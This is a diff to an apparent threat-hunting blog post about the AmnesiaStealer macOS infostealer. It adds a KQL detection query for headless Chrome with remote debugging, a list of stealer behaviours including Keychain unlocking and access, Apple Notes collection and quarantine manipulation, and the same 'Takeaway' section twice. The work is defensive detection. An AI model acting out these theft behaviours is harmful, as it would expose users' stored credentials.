+```kql
+event.category : "process" and process.command_line : *--headless* and process.command_line : *--remote-debugging-port*
+```
+
+**Result: No matching events.**
+
+A stronger hit would include additional context such as a custom `--user-data-dir`, a hidden profile directory or an unusual parent process.
+
+---
+
+### Takeaway
+
+The first half of the investigation asked:
+
+> **I found something suspicious. What did this process do?**
+
+PID and PPID pivots were extremely effective for answering that question.
+
+These hunts start from the opposite direction:
+
+> **I do not know which process is malicious yet. Which behaviors are worth investigating?**
+
+Several of the queries independently rediscovered the same Amnesia activity:
+
+- hidden payload staging under `/tmp`
+- quarantine manipulation
+- ad-hoc code signing
+- host discovery
+- Apple Notes collection
+- password validation
+- Keychain unlocking and direct access
+- archive creation
+- cleanup
+- APFS snapshot mounting
+
+Other hunts returned legitimate noise or no results at all.
+
+That is expected.
+
+Utilities such as `curl`, `xattr`, `codesign`, `dscl`, `security`, `ditto`, `system_profiler` and `mount_apfs` are not malicious by themselves.
+
+The useful signal comes from the combination of **who executed the command, where the parent process came from, what files were targeted, how quickly the events occurred and what happened immediately before and after**.
+
+| Approach | Best Used For |
+|---|---|
+| PID / PPID investigation | Reconstructing activity once something suspicious has already been identified |
+| Behavioral hunting | Finding suspicious activity without already knowing which process is malicious |
+
+Using both approaches against the same telemetry allowed the infection to be reconstructed while also producing hunting ideas that can be reused against other macOS stealers.
+
+### Takeaway
+
+The initial investigation asked:
+
+> **I found something suspicious. What did this process do?**
+
+PID and PPID pivots were extremely effective for answering that question.
+
+The behavioral hunts ask something different:
+
+> **I do not know which process is malicious yet. Which behaviors are worth investigating?**
+
+Several of these hunts independently surfaced the same Amnesia activity: quarantine manipulation, ad-hoc signing, Apple Notes collection, password validation, Keychain access, host discovery, archive creation and temporary-file cleanup.
+
+Others returned legitimate noise or no results.
+
+That is expected. Individual macOS utilities such as `curl`, `xattr`, `codesign`, `dscl`, `security`, `ditto` and `system_profiler` are not malicious. The useful signal comes from **who executed them, where the process originated, what it targeted, when it happened and what occurred immediately before and after**.
+
+Using both approaches gives us two complementary workflows:
+
+| Approach | Best Used For |
+|---|---|
+| PID / PPID investigation | Reconstructing activity after something suspicious is already known |
+| Behavioral hunting | Finding suspicious activity without already knowing the malware process |
+
+The malware family can change. The behaviors often remain useful.
 
 ### Using these as hunts rather than standalone detections
 
@@ -2065,44 +2159,6 @@ network activity or persistence
 ```
 
 That combination is much harder to explain as normal enterprise activity than any single `curl`, `xattr`, `security`, `tmutil` or `launchctl` event.
-
-## Takeaways
-
-The biggest lesson from this hunt was that following PID and PPID relationships was more useful than trying to start with a perfect checklist of AmnesiaStealer techniques.The investigation did not move cleanly from "execution" to "credential access" to "collection" to "persistence."
-
-It looked more like:
-
-```text
-suspicious curl
-    ↓
-network pivot
-    ↓
-PID dead end
-    ↓
-file artifact
-    ↓
-shared PPID
-    ↓
-bootstrap reconstructed
-    ↓
-new payload PID
-    ↓
-child processes
-    ↓
-Keychain file events
-    ↓
-diagnostic artifacts
-    ↓
-random staging directory
-    ↓
-snapshot activity
-    ↓
-archive creation
-    ↓
-persistence
-    ↓
-telemetry gap around final upload
-```
 
 That felt much closer to how I actually hunt. Sometimes the first pivot gives you nothing. Sometimes a command looks harmless until you inspect its parent. Sometimes the process telemetry is incomplete, but a surviving file artifact gives you the missing context. And sometimes the EDR shows almost the entire chain but still cannot prove one final step, such as the HTTP upload in this case. The useful part was not finding one obviously malicious command. It was gradually building enough context around otherwise normal-looking activity to understand what the process was really doing. 
 
